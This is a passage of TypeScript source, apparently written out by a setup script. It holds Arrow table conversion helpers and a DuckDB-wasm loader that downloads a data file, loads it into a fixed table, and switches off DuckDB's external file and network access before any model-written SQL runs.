  if (typeof value === "object") {
    const obj = value as Record<string, unknown>;
    // Arrow StructRow and friends expose toJSON()
    if (typeof (obj as { toJSON?: unknown }).toJSON === "function") {
      return toJs((obj as { toJSON: () => unknown }).toJSON());
    }
    const out: Record<string, unknown> = {};
    for (const [k, v] of Object.entries(obj)) out[k] = toJs(v);
    return out;
  }
  return value;
}

/** Convert an Arrow table to plain JS row objects. */
export function toRows<T = Record<string, unknown>>(table: arrow.Table): T[] {
  return table.toArray().map((row) => toJs(row) as T);
}

/** Convert an Arrow table to a single row, or null when empty. */
export function firstRow<T = Record<string, unknown>>(table: arrow.Table): T | null {
  return table.numRows === 0 ? null : (toJs(table.get(0)) as T);
}

/** Column names in order. */
export function columnNames(table: arrow.Table): string[] {
  return table.schema.fields.map((f) => f.name);
}

/** Coerce a value that should be numeric, returning null for anything else. */
export function asNumber(value: unknown): number | null {
  if (value === null || value === undefined) return null;
  if (typeof value === "number") return Number.isFinite(value) ? value : null;
  if (typeof value === "bigint") return Number(value);
  if (typeof value === "string") {
    const n = Number(value);
    return Number.isFinite(n) ? n : null;
  }
  return null;
}

cat > lib/duckdb/load.ts <<'EOF'
import type * as duckdb from "@duckdb/duckdb-wasm";
import type { SourceFormat } from "@/lib/sources/validate";
import { asNumber, firstRow, toRows } from "@/lib/arrow";

/** The single table every query runs against. Fixed, so it is never user- or
 *  model-controlled and never needs quoting in generated SQL. */
export const TABLE = "data";

export interface LoadedTable {
  /** Human-readable source name, for display only. */
  label: string;
  format: SourceFormat;
  rowCount: number;
  columns: { name: string; sqlType: string }[];
  /** Whether DuckDB accepted the lockdown described in lockDown(). */
  externalAccessDisabled: boolean;
  bytes: number;
}

export interface FetchProgress {
  loaded: number;
  total: number | null;
}

/**
 * Download the whole file with progress.
 *
 * We materialise rather than letting DuckDB range-read the URL lazily. That
 * costs memory on very large files, but it means DuckDB never touches the
 * network, which in turn lets us switch external access off entirely before any
 * model-authored SQL runs. For an in-browser tool that is the right trade.
 */
export async function fetchWithProgress(
  url: string,
  onProgress?: (p: FetchProgress) => void,
  signal?: AbortSignal,
): Promise<Uint8Array> {
  const res = await fetch(url, { signal });
  if (!res.ok) throw new Error(`Server responded ${res.status} ${res.statusText}`);

  const lengthHeader = res.headers.get("content-length");
  const total = lengthHeader ? Number(lengthHeader) : null;

  if (!res.body) return new Uint8Array(await res.arrayBuffer());

  const reader = res.body.getReader();
  const chunks: Uint8Array[] = [];
  let loaded = 0;
  for (;;) {
    const { done, value } = await reader.read();
    if (done) break;
    chunks.push(value);
    loaded += value.byteLength;
    onProgress?.({ loaded, total: Number.isFinite(total) ? total : null });
  }

  const out = new Uint8Array(loaded);
  let offset = 0;
  for (const chunk of chunks) {
    out.set(chunk, offset);
    offset += chunk.byteLength;
  }
  return out;
}

function readerFor(format: SourceFormat, file: string): string {
  switch (format) {
    case "parquet":
      return `read_parquet('${file}')`;
    case "csv":
      return `read_csv_auto('${file}')`;
    case "json":
      return `read_json_auto('${file}')`;
  }
}

/**
 * Defence in depth behind lib/hypotheses/guard.ts. Once the data is in a table
 * DuckDB has no further need to reach a file or a URL, so we take the
 * capability away. DuckDB does not allow this to be switched back on.
 */
async function lockDown(conn: duckdb.AsyncDuckDBConnection): Promise<boolean> {
  try {
    await conn.query("SET enable_external_access=false");
    return true;
  } catch {
    // Older builds only accept this at startup. The expression guard is the
    // primary defence; report the weaker posture rather than pretending.
    return false;
  }
}

export async function loadIntoDuckDB(
  db: duckdb.AsyncDuckDB,
  opts: { bytes: Uint8Array; format: SourceFormat; label: string },
): Promise<LoadedTable> {
  const file = "source_input";
  await db.dropFiles();
  await db.registerFileBuffer(file, opts.bytes);

  const conn = await db.connect();
  try {
    await conn.query(
      `CREATE OR REPLACE TABLE ${TABLE} AS SELECT * FROM ${readerFor(opts.format, file)}`,
    );

    const described = toRows<{ column_name: string; column_type: string }>(
      await conn.query(`DESCRIBE ${TABLE}`),
    );
    const counted = firstRow<{ n: unknown }>(
      await conn.query(`SELECT count(*) AS n FROM ${TABLE}`),
    );

    // The registered buffer is a second copy of the file; the table owns the
    // data now, so release it before we start profiling.
    await db.dropFile(file);
    const externalAccessDisabled = await lockDown(conn);

    return {
      label: opts.label,
      format: opts.format,
      rowCount: asNumber(counted?.n) ?? 0,
      columns: described.map((d) => ({ name: d.column_name, sqlType: d.column_type })),
      externalAccessDisabled,
      bytes: opts.bytes.byteLength,
    };
  } finally {
    await conn.close();
  }
}
